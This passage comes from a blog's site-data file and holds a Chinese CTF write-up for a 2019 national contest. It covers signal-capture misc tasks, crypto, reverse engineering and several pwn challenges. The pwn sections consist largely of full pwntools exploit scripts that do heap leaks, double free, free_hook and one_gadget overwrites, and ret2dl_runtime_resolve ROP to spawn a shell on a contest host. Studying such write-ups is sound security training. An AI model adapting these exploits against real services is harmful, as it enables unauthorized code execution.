data2[32*5:32*6]]\nming=\"aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\"\nminghex=ming.encode(\"hex\")\nkey1=int(s1[0],16)^int(minghex,16)\nkey2=int(s1[1],16)^int(minghex,16)\nkey3=int(s1[2],16)^int(minghex,16)\nminghex0=int(s2[0],16)^key1\nminghex1=int(s2[1],16)^key2\nminghex2=int(s2[2],16)^key3\nprint hex(minghex0)[2:-1].decode(\"hex\")\nprint hex(minghex1)[2:-1].decode(\"hex\")\nprint hex(minghex2)[2:-1].decode(\"hex\")\n```\n![17](/img/2019-04-23/17.png)\n#### Asymmetric\n看了一 下题目给的脚本，其实就是普通的RSA题 ,主要还是把**n**分解\n![18](/img/2019-04-23/18.png)\n剩下就 很简单了\n![19](/img/2019-04-23/19.png)\n### Re\n#### EasyGo\n查看可执行文件格式\n![20](/img/2019-04-23/20.png)\n程序为Go语言编写,内部函数较为复杂，直接IDA动态调试，定位到`sub_495150`函数，执行完`sub_4886B0`,程序打印了字符串\n![21](/img/2019-04-23/21.png)\n在`sub_48EB00`中, 程序调用了输入函数，继续执行，发现函数将一串字符串地址放到了`rax`，并在接下来的几个`CALL`中，对其进行了一些操作，这里没有仔细跟进，由于在`sub_47E620`函数处存在跳转,猜测这里可能为相关的`check`函数，重点关注其所对应的内存区域，可发现，执行完`sub_47E620`函数后,可以在内存中直接拿到flag","slug":"guosaiwp","published":1,"mouth":"04","updated":"2020-09-17T11:24:21.827Z","comments":1,"layout":"post","photos":[],"link":"","_id":"ckffbhoxk000rez8kwsn7c8cq","content":"<p>大佬的博客–&gt;<a href=\"https://www.ctfwp.com/articals/2019national.html\" target=\"_blank\" rel=\"noopener\">传送门</a><br><a id=\"more\"></a></p>\n<h3 id=\"misc\"><a href=\"#misc\" class=\"headerlink\" title=\"misc\"></a>misc</h3><h4 id=\"签到\"><a href=\"#签到\" class=\"headerlink\" title=\"签到\"></a>签到</h4><p>摄像头捕捉到三个人的脸即可</p>\n<h3 id=\"saleae\"><a href=\"#saleae\" class=\"headerlink\" title=\"saleae\"></a>saleae</h3><p>下载回来一个<code>saleae.logicdata</code>文件，经搜索发现这个saleae的可以打开的文件类型，官网地址–&gt;<a href=\"https://www.saleae.com/zh/\" target=\"_blank\" rel=\"noopener\">传送门</a>，打开文件只发现一些波形<br><img src=\"/img/2019-04-23/1.png\" srcset=\"/img/static/loading.gif\" alt=\"1\"><br>网上搜索资料看到一篇教程通过xor两条数据流得到信息，上面一条是当上面波形的电平为高电平且下面那条也是高电平时为1，下面那条是低电平则为0，如图<br><img src=\"/img/2019-04-23/2.png\" srcset=\"/img/static/loading.gif\" alt=\"2\"><br>最后得到一串数据<br><pre><code class=\"hljs undefined\"><span class=\"hljs-number\">011001100110110001100001011001110111101100110001001100100011000000110111001100010011001100111001001101110010110100110001001110010110010000110001001011010011010000111000011001010011011000101101011000100110010100111000011000110010110100110111001110000011010001100010001110000011100101100001001110010011010101100101001100000011011101111101</span></code></pre></p>\n<p>8个一组得到flag</p>\n<h4 id=\"usbasp\"><a href=\"#usbasp\" class=\"headerlink\" title=\"usbasp\"></a>usbasp</h4><p>打开文件后在<code>analyzer</code>里选择<code>SPI</code>，设置选项最下面选择<code>enable line is active hight</code><br><img src=\"/img/2019-04-23/7.png\" srcset=\"/img/static/loading.gif\" alt=\"7\"><br>右下面可以明显看到flag导出即可<br><img src=\"/img/2019-04-23/9.png\" srcset=\"/img/static/loading.gif\" alt=\"9\"></p>\n<h3 id=\"pwn\"><a href=\"#pwn\" class=\"headerlink\" title=\"pwn\"></a>pwn</h3><h4 id=\"your-pwn\"><a href=\"#your-pwn\" class=\"headerlink\" title=\"your-pwn\"></a>your-pwn</h4><p>在函数<code>sub_B35</code>里面，没有对<code>index(v1)</code>进行检查，从而造成任意地址泄露和任意地址更改。直接改返回地址为<code>one_gadget</code>即可<br><pre><code class=\"hljs undefined\">for ( <span class=\"hljs-name\">i</span> = <span class=\"hljs-number\">0</span><span class=\"hljs-comment\">; i &lt;= 40; ++i )</span>\n&#123;\nputs(<span class=\"hljs-string\">\"input index\"</span>)<span class=\"hljs-comment\">;</span>\n__isoc99_scanf(<span class=\"hljs-string\">\"%d\"</span>, <span class=\"hljs-symbol\">&amp;v1</span>)<span class=\"hljs-comment\">;</span>\nprintf(<span class=\"hljs-string\">\"now value(hex) %x\\n\"</span>, (<span class=\"hljs-name\">unsigned</span> int)v4[v1])<span class=\"hljs-comment\">;</span>\nputs(<span class=\"hljs-string\">\"input new value\"</span>)<span class=\"hljs-comment\">;</span>\n__isoc99_scanf(<span class=\"hljs-string\">\"%d\"</span>, <span class=\"hljs-symbol\">&amp;v2</span>)<span class=\"hljs-comment\">;</span>\nv4[v1] = v2<span class=\"hljs-comment\">;</span>\n&#125;</code></pre></p>\n<p>详细脚本如下：<br><pre><code class=\"hljs python\"><span class=\"hljs-keyword\">from</span> pwn <span class=\"hljs-keyword\">import</span> *\n<span class=\"hljs-comment\">#context(os='linux',arch='amd64',aslr = 'False',log_level='debug')</span>\nlocal = <span class=\"hljs-number\">0</span>\n<span class=\"hljs-keyword\">if</span> local:\n\tp = process(<span class=\"hljs-string\">\"./pwn\"</span>)\n<span class=\"hljs-keyword\">else</span>:\n\tp = remote(<span class=\"hljs-string\">\"39.97.228.196\"</span>,<span class=\"hljs-number\">60007</span>)\n<span class=\"hljs-function\"><span class=\"hljs-keyword\">def</span> <span class=\"hljs-title\">pass_</span><span class=\"hljs-params\">()</span>:</span>\n\tp.recvuntil(<span class=\"hljs-string\">\"name\"</span>)\n\tp.sendline(<span class=\"hljs-string\">\"Team233\"</span>)\n<span class=\"hljs-function\"><span class=\"hljs-keyword\">def</span> <span class=\"hljs-title\">change</span><span class=\"hljs-params\">(index, addr)</span>:</span>\n\t<span class=\"hljs-keyword\">for</span> i <span class=\"hljs-keyword\">in</span> range(<span class=\"hljs-number\">8</span>):\n\t\tp.recvuntil(<span class=\"hljs-string\">\"index\\n\"</span>)\n\t\tp.sendline(str(index+i))\n\t\tp.recvuntil(<span class=\"hljs-string\">\"now value(hex) \"</span>)\n\t\tdata = p.recvn(<span class=\"hljs-number\">1</span>)\n\t\t<span class=\"hljs-comment\">#print(\"data = \" + str(data))</span>\n\t\tp.recvuntil(<span class=\"hljs-string\">\"input new value\\n\"</span>)\n\t\tp.sendline(str(addr))\n\t\taddr = addr &gt;&gt; <span class=\"hljs-number\">8</span>\n<span class=\"hljs-function\"><span class=\"hljs-keyword\">def</span> <span class=\"hljs-title\">leak</span><span class=\"hljs-params\">(index)</span>:</span>\n\taddr = <span class=\"hljs-string\">\"\"</span>\n\t<span class=\"hljs-keyword\">for</span> i <span class=\"hljs-keyword\">in</span> range(<span class=\"hljs-number\">8</span>):\n\t\tp.recvuntil(<span class=\"hljs-string\">\"index\\n\"</span>)\n\t\tp.sendline(str(index+i))\n\t\tp.recvuntil(<span class=\"hljs-string\">\"now value(hex) \"</span>)\n\t\tdata = int(p.recvuntil(<span class=\"hljs-string\">\"\\n\"</span>,drop=<span class=\"hljs-keyword\">True</span>),<span class=\"hljs-number\">16</span>)\n\t\t<span class=\"hljs-keyword\">if</span> data &gt; <span class=\"hljs-number\">300</span>:\n\t\t\tdata = data - <span class=\"hljs-number\">0xffffff00</span>\n\t\tp.recvuntil(<span class=\"hljs-string\">\"input new value\\n\"</span>)\n\t\tp.sendline(str(data))\n\t\taddr += chr(data)\n\taddr = u64(addr)\n\t<span class=\"hljs-keyword\">return</span> addr\n<span class=\"hljs-function\"><span class=\"hljs-keyword\">def</span> <span class=\"hljs-title\">exp</span><span class=\"hljs-params\">()</span>:</span>\n\tpass_()\n\t<span class=\"hljs-comment\">#gdb.attach(p)addr = leak(0x158)</span>\n\telf_base = addr - <span class=\"hljs-number\">0xb11</span>\n\t<span class=\"hljs-keyword\">print</span> <span class=\"hljs-string\">'[*] elf_base :'</span>,hex(elf_base)\n\taddr = leak(<span class=\"hljs-number\">0x160</span>+<span class=\"hljs-number\">0x118</span>)\n\tlibc_base = addr - <span class=\"hljs-number\">0x20830</span>\n\tone_shot = libc_base + <span class=\"hljs-number\">0xf02a4</span>\n\t<span class=\"hljs-keyword\">print</span> <span class=\"hljs-string\">'[*] one_shot :'</span>,hex(one_shot)\n\t<span class=\"hljs-keyword\">print</span> <span class=\"hljs-string\">'[*] libc_base :'</span>,hex(libc_base)\n\tpause()\n\tchange(<span class=\"hljs-number\">0x158</span>,one_shot)\n\tp.sendline(<span class=\"hljs-string\">\"no\"</span>)\n\tp.sendline(<span class=\"hljs-string\">\"cat flag\"</span>)\n\tp.interactive()\nexp()</code></pre></p>\n<p><img src=\"/img/2019-04-23/3.png\" srcset=\"/img/static/loading.gif\" alt=\"3\"></p>\n<h4 id=\"daily\"><a href=\"#daily\" class=\"headerlink\" title=\"daily\"></a>daily</h4><p>由于是<code>%s</code>打印内 容，会一直打印遇到<code>\\x00</code>才会停止，而且<code>add</code>的时候通过<code>read</code>读入没有写入字符串后缀，所以可以利用这一点可以泄露<code>libc</code>地址和<code>heap</code>地址。泄露利用如下：<br><pre><code class=\"hljs undefined\"><span class=\"hljs-function\"><span class=\"hljs-title\">create</span><span class=\"hljs-params\">(<span class=\"hljs-number\">0</span>x60,<span class=\"hljs-string\">\"a\"</span>*<span class=\"hljs-number\">0</span>x20)</span></span>#<span class=\"hljs-number\">0</span>\n<span class=\"hljs-function\"><span class=\"hljs-title\">create</span><span class=\"hljs-params\">(<span class=\"hljs-number\">0</span>x60,<span class=\"hljs-string\">\"a\"</span>*<span class=\"hljs-number\">0</span>x20)</span></span>#<span class=\"hljs-number\">1</span>\n<span class=\"hljs-function\"><span class=\"hljs-title\">create</span><span class=\"hljs-params\">(<span class=\"hljs-number\">0</span>x60,<span class=\"hljs-string\">\"b\"</span>*<span class=\"hljs-number\">0</span>x20)</span></span>#<span class=\"hljs-number\">2</span>\n<span class=\"hljs-function\"><span class=\"hljs-title\">delete</span><span class=\"hljs-params\">(<span class=\"hljs-number\">0</span>)</span></span>\n<span class=\"hljs-function\"><span class=\"hljs-title\">delete</span><span class=\"hljs-params\">(<span class=\"hljs-number\">1</span>)</span></span>\n<span class=\"hljs-function\"><span class=\"hljs-title\">create</span><span class=\"hljs-params\">(<span class=\"hljs-number\">0</span>x60,<span class=\"hljs-string\">\"a\"</span>)</span></span>#<span class=\"hljs-number\">0</span>\n<span class=\"hljs-function\"><span class=\"hljs-title\">show</span><span class=\"hljs-params\">()</span></span>\n<span class=\"hljs-selector-tag\">p</span>.recvuntil(<span class=\"hljs-string\">\"0 : a\"</span>)\ndata = <span class=\"hljs-string\">\"\\x00\"</span>+<span class=\"hljs-selector-tag\">p</span>.recvuntil(<span class=\"hljs-string\">\"2\"</span>,drop=True)\nheap = u64(data.ljust(<span class=\"hljs-number\">8</span>,<span class=\"hljs-string\">\"\\x00\"</span>))\nprint <span class=\"hljs-string\">\"[*]heap : \"</span>, hex(heap)\n<span class=\"hljs-function\"><span class=\"hljs-title\">create</span><span class=\"hljs-params\">(<span class=\"hljs-number\">0</span>x100,<span class=\"hljs-string\">\"a\"</span>*<span class=\"hljs-number\">0</span>x20)</span></span>#<span class=\"hljs-number\">1</span> \n<span class=\"hljs-function\"><span class=\"hljs-title\">create</span><span class=\"hljs-params\">(<span class=\"hljs-number\">0</span>x100,<span class=\"hljs-string\">\"a\"</span>*<span class=\"hljs-number\">0</span>x20)</span></span>#<span class=\"hljs-number\">3</span> \n<span class=\"hljs-function\"><span class=\"hljs-title\">delete</span><span class=\"hljs-params\">(<span class=\"hljs-number\">1</span>)</span></span>\n<span class=\"hljs-function\"><span class=\"hljs-title\">create</span><span class=\"hljs-params\">(<span class=\"hljs-number\">0</span>x20,<span class=\"hljs-string\">\"a\"</span>*<span class=\"hljs-number\">0</span>x20)</span></span>#<span class=\"hljs-number\">1</span>\n<span class=\"hljs-function\"><span class=\"hljs-title\">create</span><span class=\"hljs-params\">(<span class=\"hljs-number\">0</span>xd0,<span class=\"hljs-string\">\"a\"</span>*<span class=\"hljs-number\">8</span>)</span></span>#<span class=\"hljs-number\">4</span>\n<span class=\"hljs-function\"><span class=\"hljs-title\">show</span><span class=\"hljs-params\">()</span></span>\n<span class=\"hljs-selector-tag\">p</span>.recvuntil(<span class=\"hljs-string\">\"4 : aaaaaaaa\"</span>)\ndata = <span class=\"hljs-selector-tag\">p</span>.recvn(<span class=\"hljs-number\">6</span>) + <span class=\"hljs-string\">\"\\x00\\x00\"</span>\nlibc_base = u64(data) - <span class=\"hljs-number\">0</span>x3c4b78</code></pre></p>\n<p>然后利用<code>free</code>的时候没有检查<code>index(v1)</code>，漏洞点如下程序部分代码，造成<code>UAF</code>分配到<code>bss</code>上的<code>chunk_list</code>，然后改<code>free</code>就可以了 。<br><pre><code class=\"hljs undefined\">printf(<span class=\"hljs-string\">\"Please enter the index of daily:\"</span>)<span class=\"hljs-comment\">;</span>\nread(<span class=\"hljs-number\">0</span>, &amp;<span class=\"hljs-keyword\">buf, </span><span class=\"hljs-number\">8</span>uLL)<span class=\"hljs-comment\">;</span>\n<span class=\"hljs-built_in\">v1</span> = atoi(&amp;<span class=\"hljs-keyword\">buf);\n</span>if ( chunk[<span class=\"hljs-built_in\">v1</span>].ptr )\n&#123;\nfree((void *)chunk[<span class=\"hljs-built_in\">v1</span>].ptr)<span class=\"hljs-comment\">;</span>\nchunk[<span class=\"hljs-built_in\">v1</span>].ptr = <span class=\"hljs-number\">0</span>LL<span class=\"hljs-comment\">;</span>\nLODWORD(chunk[<span class=\"hljs-built_in\">v1</span>].len) = <span class=\"hljs-number\">0</span><span class=\"hljs-comment\">;</span>\nputs(<span class=\"hljs-string\">\"remove successful!!\"</span>)<span class=\"hljs-comment\">;</span>\n--chunk_num<span class=\"hljs-comment\">;</span>\n&#125;</code></pre></p>\n<p>然后利用<code>Double free</code>得到<code>bss</code>段上的<code>chunk_list</code>,然后控制<code>chunk</code>，实现任意地址写，然后我们写<code>free_hook</code>地址为<code>system</code>，再<code>free</code>的时候就可以<code>getshell</code>了。在这之前，我们尝试了申请到<code>malloc_hook</code>前面然后把<code>malloc_hoook</code>覆盖为<code>one_gadget</code>，但是没有一个<code>one_gadget</code>可以成功，主要是因为条件没有满足，后来就直接<code>free_hook</code>了。详细脚本如下：<br><pre><code class=\"hljs python\"><span class=\"hljs-keyword\">from</span> pwn <span class=\"hljs-keyword\">import</span> *\n<span class=\"hljs-comment\">#context(os='linux',arch='amd64',aslr = 'False',log_level='debug')</span>\nlocal = <span class=\"hljs-number\">0</span>\n<span class=\"hljs-keyword\">if</span> local:\n\tp = process(<span class=\"hljs-string\">\"./pwn\"</span>)\n<span class=\"hljs-keyword\">else</span>:\n\tp = remote(<span class=\"hljs-string\">\"39.97.228.196\"</span>,<span class=\"hljs-number\">60006</span>)\n\n<span class=\"hljs-function\"><span class=\"hljs-keyword\">def</span> <span class=\"hljs-title\">show</span><span class=\"hljs-params\">()</span>:</span>\n\tp.recvuntil(<span class=\"hljs-string\">\":\"</span>)\n\tp.sendline(<span class=\"hljs-string\">\"1\"</span>) \n\n<span class=\"hljs-function\"><span class=\"hljs-keyword\">def</span> <span class=\"hljs-title\">create</span><span class=\"hljs-params\">(lens,content)</span>:</span>\n\tp.recvuntil(<span class=\"hljs-string\">\":\"</span>)\n\tp.sendline(<span class=\"hljs-string\">\"2\"</span>) \n\tp.recvuntil(<span class=\"hljs-string\">\":\"</span>)\n\tp.sendline(str(lens)) \n\tp.recv()\n\tp.send(content)\n\n<span class=\"hljs-function\"><span class=\"hljs-keyword\">def</span> <span class=\"hljs-title\">change</span><span class=\"hljs-params\">(index,content)</span>:</span>\n\tp.recvuntil(<span class=\"hljs-string\">\":\"</span>)\n\tp.sendline(<span class=\"hljs-string\">\"3\"</span>) \n\tp.recvuntil(<span class=\"hljs-string\">\":\"</span>)\n\tp.sendline(str(index)) \n\tp.recv()\n\tp.send(content)\n\n<span class=\"hljs-function\"><span class=\"hljs-keyword\">def</span> <span class=\"hljs-title\">delete</span><span class=\"hljs-params\">(index)</span>:</span>\n\tp.recvuntil(<span class=\"hljs-string\">\":\"</span>)\n\tp.sendline(<span class=\"hljs-string\">\"4\"</span>) \n\tp.recvuntil(<span class=\"hljs-string\">\":\"</span>)\n\tp.sendline(str(index)) \nchunk_list = <span class=\"hljs-number\">0x602060</span>\n\n<span class=\"hljs-function\"><span class=\"hljs-keyword\">def</span> <span class=\"hljs-title\">exp</span><span class=\"hljs-params\">()</span>:</span> \n\tcreate(<span class=\"hljs-number\">0x60</span>,<span class=\"hljs-string\">\"a\"</span>*<span class=\"hljs-number\">0x20</span>)<span class=\"hljs-comment\">#0</span>\n\tcreate(<span class=\"hljs-number\">0x60</span>,<span class=\"hljs-string\">\"a\"</span>*<span class=\"hljs-number\">0x20</span>)<span class=\"hljs-comment\">#1</span>\n\tcreate(<span class=\"hljs-number\">0x60</span>,<span class=\"hljs-string\">\"b\"</span>*<span class=\"hljs-number\">0x20</span>)<span class=\"hljs-comment\">#2</span>\n\tdelete(<span class=\"hljs-number\">0</span>)\n\tdelete(<span class=\"hljs-number\">1</span>)\n\tcreate(<span class=\"hljs-number\">0x60</span>,<span class=\"hljs-string\">\"a\"</span>)<span class=\"hljs-comment\">#0</span>\n\tshow()\n\tp.recvuntil(<span class=\"hljs-string\">\"0 : a\"</span>)\n\tdata = <span class=\"hljs-string\">\"\\x00\"</span>+p.recvuntil(<span class=\"hljs-string\">\"2\"</span>,drop=<span class=\"hljs-keyword\">True</span>)\n\theap = u64(data.ljust(<span class=\"hljs-number\">8</span>,<span class=\"hljs-string\">\"\\x00\"</span>))\n\t<span class=\"hljs-keyword\">print</span> <span class=\"hljs-string\">\"[*]heap : \"</span>, hex(heap)\n\tcreate(<span class=\"hljs-number\">0x100</span>,<span class=\"hljs-string\">\"a\"</span>*<span class=\"hljs-number\">0x20</span>)<span class=\"hljs-comment\">#1</span>\n\tcreate(<span class=\"hljs-number\">0x100</span>,<span class=\"hljs-string\">\"a\"</span>*<span class=\"hljs-number\">0x20</span>)<span class=\"hljs-comment\">#3</span>\n\tdelete(<span class=\"hljs-number\">1</span>)\n\tcreate(<span class=\"hljs-number\">0x20</span>,<span class=\"hljs-string\">\"a\"</span>*<span class=\"hljs-number\">0x20</span>)<span class=\"hljs-comment\">#1</span>\n\tcreate(<span class=\"hljs-number\">0xd0</span>,<span class=\"hljs-string\">\"a\"</span>*<span class=\"hljs-number\">8</span>)<span class=\"hljs-comment\">#4</span>\n\tshow()\n\tp.recvuntil(<span class=\"hljs-string\">\"4 : aaaaaaaa\"</span>)\n\tdata = p.recvn(<span class=\"hljs-number\">6</span>) + <span class=\"hljs-string\">\"\\x00\\x00\"</span>\n\tlibc_base = u64(data) - <span class=\"hljs-number\">0x3c4b78</span>\n\tmalloc_hook = libc_base + <span class=\"hljs-number\">0x3c4b10</span>\n\tone_shot = libc_base + <span class=\"hljs-number\">0xf02a4</span>\n\tfree_hook = libc_base + <span class=\"hljs-number\">0x3c67a8</span>\n\tsystem = libc_base + <span class=\"hljs-number\">0x45390</span>\n\t<span class=\"hljs-keyword\">print</span> <span class=\"hljs-string\">'[*]libc_base : '</span>,hex(libc_base)\n\t<span class=\"hljs-keyword\">print</span> <span class=\"hljs-string\">'[*]malloc_hook : '</span>,hex(malloc_hook)\n\t<span class=\"hljs-keyword\">print</span> <span class=\"hljs-string\">'[*]free_hook : '</span>,hex(free_hook)\n\t<span class=\"hljs-keyword\">print</span> <span class=\"hljs-string\">'[*]one_shot : '</span>,hex(one_shot)\n\t<span class=\"hljs-keyword\">print</span> <span class=\"hljs-string\">'[*]system : '</span>,hex(system)\n\tindex = (heap - chunk_list + <span class=\"hljs-number\">8</span>)/<span class=\"hljs-number\">0x10</span> + <span class=\"hljs-number\">15</span>\n\t<span class=\"hljs-keyword\">print</span> <span class=\"hljs-string\">'[*]index : '</span>,hex(index)\n\tchange(<span class=\"hljs-number\">2</span>,<span class=\"hljs-string\">\"a\"</span>*<span class=\"hljs-number\">8</span>+p64(heap+<span class=\"hljs-number\">0x10</span>))\n\tcreate(<span class=\"hljs-number\">0x71</span>,<span class=\"hljs-string\">\"h\"</span>*<span class=\"hljs-number\">0x71</span>)<span class=\"hljs-comment\">#5</span>\n\tcreate(<span class=\"hljs-number\">0x60</span>,<span class=\"hljs-string\">\"e\"</span>*<span class=\"hljs-number\">0x60</span>) <span class=\"hljs-comment\">#6</span>\n\tcreate(<span class=\"hljs-number\">0x60</span>,<span class=\"hljs-string\">\"b\"</span>*<span class=\"hljs-number\">0x60</span>) <span class=\"hljs-comment\">#7</span>\n\t<span class=\"hljs-comment\">#gdb.attach(p)</span>\n\tdelete(<span class=\"hljs-number\">6</span>)\n\tdelete(<span class=\"hljs-number\">7</span>)\n\tdelete(index)\n\tcreate(<span class=\"hljs-number\">0x60</span>,p64(<span class=\"hljs-number\">0x6020a8</span>)) <span class=\"hljs-comment\">#6</span>\n\tcreate(<span class=\"hljs-number\">0x60</span>,<span class=\"hljs-string\">\"c\"</span>*<span class=\"hljs-number\">0x60</span>) <span class=\"hljs-comment\">#7</span>\n\tcreate(<span class=\"hljs-number\">0x60</span>,<span class=\"hljs-string\">\"/bin/sh\\x00\"</span>) <span class=\"hljs-comment\">#8</span>\n\tpayload = p64(free_hook) + p64(<span class=\"hljs-number\">0x20</span>) + p64(heap+<span class=\"hljs-number\">0x10</span>) payload = payload.ljust(<span class=\"hljs-number\">0x60</span>,<span class=\"hljs-string\">\"\\x00\"</span>)\n\tcreate(<span class=\"hljs-number\">0x60</span>, payload) <span class=\"hljs-comment\">#9</span>\n\tshow()\n\tchange(<span class=\"hljs-number\">5</span>,p64(system))\n\tdelete(<span class=\"hljs-number\">6</span>)\n\tp.recv()\n\t<span class=\"hljs-comment\">#gdb.attach(p)</span>\n\tp.interactive() \n\nexp()</code></pre></p>\n<p>最后成功 getshell<br><img src=\"/img/2019-04-23/4.png\" srcset=\"/img/static/loading.gif\" alt=\"4\"></p>\n<h4 id=\"babypwn\"><a href=\"#babypwn\" class=\"headerlink\" title=\"babypwn\"></a>babypwn</h4><p>直接<code>read</code>读入<code>0x100</code>直接造成栈溢出，但是这题的难点在于没有泄露函数，不能直接<code>return to libc</code>，所以这里利用<code>ret2_dl_runtime_resolve</code>，之前做过0ctf2018的babystack 跟这个类似，先是尝试了<code>roputils</code>库实现，后来发现有点问题总是调不对，后来直接手工干了一波。操作如下：<br><pre><code class=\"hljs python\"><span class=\"hljs-comment\"># -*- coding:utf-8 -*-</span>\n<span class=\"hljs-keyword\">from</span> pwn <span class=\"hljs-keyword\">import</span> *\ncontext.log_level = <span class=\"hljs-string\">'debug'</span>\n<span class=\"hljs-comment\">#p = process('./pwn')</span>\np = remote(ip,port)\nelf = ELF(<span class=\"hljs-string\">'./pwn'</span>)\nread_plt = elf.plt[<span class=\"hljs-string\">'read'</span>]\nalarm_plt = elf.plt[<span class=\"hljs-string\">'alarm'</span>]\npop_ebp_ret = <span class=\"hljs-number\">0x080485db</span>\nppp_ret = <span class=\"hljs-number\">0x080485d9</span>\npp_ebp_ret = <span class=\"hljs-number\">0x080485da</span>\nleave_ret = <span class=\"hljs-number\">0x08048448</span>\nstack_size = <span class=\"hljs-number\">0x800</span>\nbss_addr = <span class=\"hljs-number\">0x0804a040</span> <span class=\"hljs-comment\">#readelf -S babystack | grep \".bss\" base_stage = bss_addr + stack_size</span>\nplt_0 = <span class=\"hljs-number\">0x8048380</span> <span class=\"hljs-comment\"># objdump -d -j .plt babystack</span>\nrel_plt = <span class=\"hljs-number\">0x804833c</span> <span class=\"hljs-comment\"># objdump -s -j .rel.plt babystack index_offset = (base_stage + 28) - rel_plt</span>\nalarm_got = elf.got[<span class=\"hljs-string\">'alarm'</span>]\n<span class=\"hljs-keyword\">print</span> <span class=\"hljs-string\">\"alarm_got: \"</span>,hex(alarm_got)\n<span class=\"hljs-keyword\">print</span> <span class=\"hljs-string\">\"alarm_plt: \"</span>,hex(alarm_plt)\n<span class=\"hljs-keyword\">print</span> <span class=\"hljs-string\">\"read_plt: \"</span>,hex(read_plt)\ndynsym = <span class=\"hljs-number\">0x80481DC</span>\ndynstr = <span class=\"hljs-number\">0x804827C</span>\nfake_sym_addr = base_stage + <span class=\"hljs-number\">36</span>\nalign = <span class=\"hljs-number\">0x10</span> - ((fake_sym_addr - dynsym) &amp; <span class=\"hljs-number\">0xf</span>) fake_sym_addr = fake_sym_addr + align\nindex_dynsym = (fake_sym_addr - dynsym) / <span class=\"hljs-number\">0x10</span>\nr_info = index_dynsym &lt;&lt; <span class=\"hljs-number\">8</span> | <span class=\"hljs-number\">0x7</span>\nfake_reloc = p32(alarm_got) + p32(r_info)\nst_name = fake_sym_addr + <span class=\"hljs-number\">0x10</span> - dynstr\nfake_sym = p32(st_name) + p32(<span class=\"hljs-number\">0</span>) + p32(<span class=\"hljs-number\">0</span>) + p32(<span class=\"hljs-number\">0x12</span>)\npayload = <span class=\"hljs-string\">'a'</span>*<span class=\"hljs-number\">0x28</span> + p32(bss_addr)\npayload += p32(read_plt) + p32(leave_ret) + p32(<span class=\"hljs-number\">0</span>) + p32(bss_addr) + p32(<span class=\"hljs-number\">36</span>)\n<span class=\"hljs-comment\">#raw_input(\"go:\")</span>\np.send(payload)\n<span class=\"hljs-comment\">#fake stack 1 bss_addr</span>\npayload1 = <span class=\"hljs-string\">'aaaa'</span> <span class=\"hljs-comment\">#pop ebp</span>\npayload1 += p32(read_plt) + p32(ppp_ret) + p32(<span class=\"hljs-number\">0</span>) + p32(base_stage) + p32(<span class=\"hljs-number\">100</span>) payload1 += p32(pop_ebp_ret) + p32(base_stage) <span class=\"hljs-comment\">#fake stack again</span>\npayload1 += p32(leave_ret) <span class=\"hljs-comment\">#leave: mov esp,ebp; pop ebp</span>\np.send(payload1)\ncmd = <span class=\"hljs-string\">\"/bin/sh\"</span>\n<span class=\"hljs-comment\">#fake stack 2 base_stage</span>\npayload2 = <span class=\"hljs-string\">'bbbb'</span>\npayload2 += p32(plt_0)\npayload2 += p32(index_offset)\npayload2 += <span class=\"hljs-string\">'aaaa'</span>\npayload2 += p32(base_stage + <span class=\"hljs-number\">80</span>)\npayload2 += <span class=\"hljs-string\">'aaaa'</span>\npayload2 += <span class=\"hljs-string\">'aaaa'</span>\npayload2 += fake_reloc <span class=\"hljs-comment\">#base_stage+28</span>\npayload2 += <span class=\"hljs-string\">'b'</span> * align\npayload2 += fake_sym <span class=\"hljs-comment\">#base_stage+36</span>\npayload2 += <span class=\"hljs-string\">\"system\\x00\"</span>\npayload2 += <span class=\"hljs-string\">'a'</span> * (<span class=\"hljs-number\">80</span> - len(payload2))\npayload2 += cmd +<span class=\"hljs-string\">'\\x00'</span>\n<span class=\"hljs-comment\">#payload2 += 'a' * (100 - len(payload2))</span>\n<span class=\"hljs-keyword\">print</span> len(payload2)\nsleep(<span class=\"hljs-number\">1</span>)\np.sendline(payload2)\n<span class=\"hljs-comment\">#p.sendline(\"icq0030af22ece42d03523c08138525f\")</span>\np.interactive()</code></pre></p>\n<p><img src=\"/img/2019-04-23/22.png\" srcset=\"/img/static/loading.gif\" alt=\"22\"></p>\n<h4 id=\"double\"><a href=\"#double\" class=\"headerlink\" title=\"double\"></a>double</h4><p><img src=\"/img/2019-04-23/5.png\" srcset=\"/img/static/loading.gif\" alt=\"5\"><br>由于这个对比，只要输入的<code>data</code>相同则不会分配堆块给<code>data</code>，造成两个指针指向同一个<code>data</code>。只要申请两个相同内容大小为<code>smallbin</code>，<code>free</code>掉 一个指针，<code>show</code>另一个指针即可获得<code>libc</code>的地址。同理只要<code>free</code>掉其中一个，在对另一个相同指向的指针进行<code>edit</code>，就可以改变<code>fd</code>。将<code>fd</code>改成<code>malloc_hook</code>，再将<code>malloc_hook</code>的值改成<code>one_gadget</code>即可getshell。<br>详细脚本如下：<br><pre><code class=\"hljs python\"><span class=\"hljs-keyword\">from</span> pwn <span class=\"hljs-keyword\">import</span> *\n<span class=\"hljs-comment\">#context(os='linux',arch='amd64',aslr = 'False',log_level='debug')</span>\nlocal = <span class=\"hljs-number\">0</span>\n<span class=\"hljs-keyword\">if</span> local:\n\tp = process(<span class=\"hljs-string\">\"./pwn\"</span>)\n<span class=\"hljs-keyword\">else</span>:\n\tp = remote(<span class=\"hljs-string\">\"39.97.228.196\"</span>,<span class=\"hljs-number\">60004</span>)\n\n<span class=\"hljs-function\"><span class=\"hljs-keyword\">def</span> <span class=\"hljs-title\">create</span><span class=\"hljs-params\">(content)</span>:</span>\n\tp.recvuntil(<span class=\"hljs-string\">\"&gt; \"</span>)\n\tp.sendline(<span class=\"hljs-string\">\"1\"</span>)\n\tsleep(<span class=\"hljs-number\">0.1</span>)\n\tp.sendline(content)\n\n<span class=\"hljs-function\"><span class=\"hljs-keyword\">def</span> <span class=\"hljs-title\">show</span><span class=\"hljs-params\">(index)</span>:</span>\n\tp.recvuntil(<span class=\"hljs-string\">\"&gt; \"</span>)\n\tp.sendline(<span class=\"hljs-string\">\"2\"</span>)\n\tp.recv()\n\tp.sendline(str(index))\n\n<span class=\"hljs-function\"><span class=\"hljs-keyword\">def</span> <span class=\"hljs-title\">edit</span><span class=\"hljs-params\">(index,content)</span>:</span>\n\tp.recvuntil(<span class=\"hljs-string\">\"&gt; \"</span>)\n\tp.sendline(<span class=\"hljs-string\">\"3\"</span>)\n\tp.recv()\n\tp.sendline(str(index))\n\tsleep(<span class=\"hljs-number\">0.1</span>)\n\tp.sendline(content)\n\n<span class=\"hljs-function\"><span class=\"hljs-keyword\">def</span> <span class=\"hljs-title\">free</span><span class=\"hljs-params\">(index)</span>:</span>\n\tp.recvuntil(<span 